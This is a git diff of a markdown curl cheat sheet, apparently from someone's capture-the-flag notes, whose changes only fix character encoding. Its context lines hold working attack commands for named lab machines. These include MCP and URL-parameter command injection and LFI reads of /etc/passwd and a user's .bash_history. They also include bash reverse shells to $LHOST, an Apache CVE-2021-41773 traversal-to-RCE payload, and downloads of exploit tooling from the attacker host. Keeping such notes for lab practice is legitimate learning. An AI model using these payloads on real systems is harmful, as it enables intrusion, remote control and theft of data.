@@ -1,4 +1,4 @@
-ï»¿# curl
+# curl
 
 ## Decryptify Commands
 
@@ -26,7 +26,7 @@ curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
 ```
-Used on: **Kobold** â€” exploits unsanitized `command` / `args` in an MCP endpoint.
+Used on: **Kobold** — exploits unsanitized `command` / `args` in an MCP endpoint.
 
 ### Reverse shell via JSON payload
 ```bash
@@ -107,13 +107,13 @@ curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
 ```
 Used on: **MonitorsFour**
 
-### LFI â€” read arbitrary files through a PHP page parameter
+### LFI — read arbitrary files through a PHP page parameter
 ```bash
 curl "http://dev.team.thm/script.php?page=/etc/passwd"
 curl "http://dev.team.thm/script.php?page=/etc/vsftpd.conf"
 curl "http://dev.team.thm/script.php?page=/etc/ssh/sshd_config"
 ```
-Used on: **Team** â€” `page` parameter passes input unsanitized to `include()`.
+Used on: **Team** — `page` parameter passes input unsanitized to `include()`.
 
 ### Codiad authentication (obtain session cookie)
 ```bash
@@ -122,7 +122,7 @@ curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authen
   --data-raw 'username=john&password=password&theme=default&language=en' \
   -c cookies.txt
 ```
-Used on: **IDE** â€” first step before triggering CVE-2018-14009.
+Used on: **IDE** — first step before triggering CVE-2018-14009.
 
 ### SOAP command injection (Windows)
 ```bash
@@ -138,14 +138,14 @@ Used on: **Overwatch**
 curl "http://$TARGET/assets/index.php?cmd=whoami"            # base64 reply -> pipe through `base64 -d`
 curl "http://$TARGET/assets/index.php?cmd=/usr/bin/bash%20-c%20'/usr/bin/bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'"
 ```
-Used on: **Yueiua** â€” every space `%20`, every `&` `%26`, every `?` `%3F`. See [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md).
+Used on: **Yueiua** — every space `%20`, every `&` `%26`, every `?` `%3F`. See [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md).
 
 ### Hidden-API LFI via `?show=`
 ```bash
 curl -s "http://$TARGET:5000/api/v1/resources/books?show=/home/sid/.bash_history"
 curl -s "http://$TARGET:5000/api/v1/resources/books?show=/etc/passwd"
 ```
-Used on: **Bookstore** â€” discovered via [hidden-parameter-fuzzing.md](../../exploits/web-disclosure/hidden-parameter-fuzzing.md), feeds [werkzeug-debug-rce.md](../../exploits/web-rce/werkzeug-debug-rce.md).
+Used on: **Bookstore** — discovered via [hidden-parameter-fuzzing.md](../../exploits/web-disclosure/hidden-parameter-fuzzing.md), feeds [werkzeug-debug-rce.md](../../exploits/web-rce/werkzeug-debug-rce.md).
 
 ### Apache 2.4.49 path-traversal (CVE-2021-41773) -- file read
 ```bash
@@ -153,22 +153,22 @@ curl --path-as-is "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 ```
 Used on: **ohmyweb**
 
-`--path-as-is` is **mandatory** â€” without it libcurl normalises `..` segments client-side and the server never sees the traversal.
+`--path-as-is` is **mandatory** — without it libcurl normalises `..` segments client-side and the server never sees the traversal.
 
-### Apache 2.4.49 path-traversal â€” RCE via POST to a shell binary
+### Apache 2.4.49 path-traversal — RCE via POST to a shell binary
 ```bash
 curl -s --path-as-is -X POST \
   "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash" \
   -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/$LHOST/4444 0>&1'
 ```
-Used on: **ohmyweb** â€” first two `echo`s emit a valid CGI header; without them Apache returns 500 even though the command ran. Full chain in [apache-path-traversal-rce.md](../../exploits/web-rce/apache-path-traversal-rce.md).
+Used on: **ohmyweb** — first two `echo`s emit a valid CGI header; without them Apache returns 500 even though the command ran. Full chain in [apache-path-traversal-rce.md](../../exploits/web-rce/apache-path-traversal-rce.md).
 
 ### Pull a static binary into a stripped container
 ```bash
 curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
 curl -fsSL http://$LHOST/CVE-2021-38647.py -o /tmp/exploit.py
 ```
-Used on: **ohmyweb** â€” `-fsSL` = fail-on-error, silent, show-error, follow-redirects. The default for any one-shot tooling drop. See [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md).
+Used on: **ohmyweb** — `-fsSL` = fail-on-error, silent, show-error, follow-redirects. The default for any one-shot tooling drop. See [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md).
 
 ### Bulk-download `.DS_Store` files for offline parsing
 ```bash
@@ -176,4 +176,6 @@ for path in / /assets /assets/js /assets/images /assets/images/shape; do
   curl -fsSL -o "${path//\//_}.DS_Store" "http://$TARGET${path}/.DS_Store"
 done
 ```
-Used on: **ohmyweb** â€” see [ds-store-disclosure.md](../../exploits/web-disclosure/ds-store-disclosure.md).
+Used on: **ohmyweb** — see [ds-store-disclosure.md](../../exploits/web-disclosure/ds-store-disclosure.md).
+
+
